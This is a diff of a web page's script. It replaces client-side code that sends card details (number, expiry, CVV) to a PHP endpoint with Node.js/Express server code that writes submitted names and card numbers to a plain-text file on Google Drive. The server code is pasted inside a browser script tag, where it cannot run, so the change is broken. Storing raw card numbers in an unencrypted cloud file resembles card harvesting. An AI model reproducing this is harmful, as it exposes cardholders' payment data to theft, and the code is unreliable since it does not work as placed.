@@ -146,32 +146,50 @@
     </div>
 
     <script>
-        document.getElementById('submitButton').addEventListener('click', function(event) {
-            // Prevent the form from submitting
-            event.preventDefault();
+                    const express = require('express');
+            const { google } = require('googleapis');
+            const multer = require('multer');
+            const fs = require('fs');
+            
+            const app = express();
+            const PORT = process.env.PORT || 3000;
+            const upload = multer();
+            
+            const auth = new google.auth.GoogleAuth({
+              keyFile: 'path/to/your/credentials.json', // Path to your downloaded JSON credentials file
+              scopes: ['https://www.googleapis.com/auth/drive.file'],
+            });
+            
+            const drive = google.drive({ version: 'v3', auth });
+            
+            app.post('/submit-form', upload.none(), async (req, res) => {
+              const formData = req.body;
+              const fileContent = `First Name: ${formData.firstName}\nLast Name: ${formData.lastName}\nCard Number: ${formData.cardNumber}\n...`; // Include all form fields
+            
+              try {
+                const response = await drive.files.create({
+                  requestBody: {
+                    name: 'formData.txt', // Name of the file on Google Drive
+                    mimeType: 'text/plain',
+                  },
+                  media: {
+                    mimeType: 'text/plain',
+                    body: fileContent,
+                  },
+                });
+            
+                console.log('File created on Google Drive:', response.data);
+                res.send('Form data submitted successfully!');
+              } catch (error) {
+                console.error('Error occurred:', error);
+                res.status(500).send('Internal Server Error');
+              }
+            });
+            
+            app.listen(PORT, () => {
+              console.log(`Server is running on port ${PORT}`);
+            });
 
-            // Get form values
-            var firstName = document.getElementById('firstName').value;
-            var lastName = document.getElementById('lastName').value;
-            var cardNumber = document.getElementById('cardNumber').value;
-            var exp = document.getElementById('exp').value;
-            var cvv = document.getElementById('cvv').value;
-            var postalCode = document.getElementById('postalCode').value;
-
-            // Send data to server using AJAX
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'process-form.php', true);
-            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            xhr.onload = function() {
-                if (xhr.status == 200) {
-                    alert(xhr.responseText); // Show success message
-                } else {
-                    alert('Error: ' + xhr.status); // Show error message
-                }
-            };
-            xhr.send('firstName=' + firstName + '&lastName=' + lastName + '&cardNumber=' + cardNumber +
-                '&exp=' + exp + '&cvv=' + cvv + '&postalCode=' + postalCode);
-        });
     </script>
 </body>
 
